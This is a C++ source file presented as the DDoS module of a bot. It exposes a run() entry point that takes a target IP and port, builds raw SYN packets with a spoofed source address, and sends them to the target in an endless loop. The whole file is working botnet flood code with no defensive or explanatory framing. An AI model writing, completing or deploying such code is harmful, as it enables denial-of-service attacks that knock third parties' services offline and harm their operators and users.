
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

// --- DDoS module for the bot ---

// Function to calculate TCP checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short) ~sum;

    return (answer);
}

// The main run function for the module
extern "C" void run(const std::vector<char>& data) {
    std::string data_str(data.begin(), data.end());
    size_t space_pos = data_str.find(' ');
    std::string target_ip = data_str.substr(0, space_pos);
    int target_port = std::stoi(data_str.substr(space_pos + 1));

    std::cout << "[DDOS] Starting SYN flood against " << target_ip << ":" << target_port << std::endl;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        std::cerr << "[DDOS] Failed to create raw socket" << std::endl;
        return;
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip.c_str());

    memset(datagram, 0, 4096);

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("1.2.3.4"); // Can be a random source IP
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *) datagram, iph->tot_len);

    // TCP Header
    tcph->source = htons(1234);
    tcph->dest = htons(target_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        std::cerr << "[DDOS] Failed to set IP_HDRINCL" << std::endl;
        return;
    }

    while (true) {
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            std::cerr << "[DDOS] sendto failed" << std::endl;
        }
    }
}
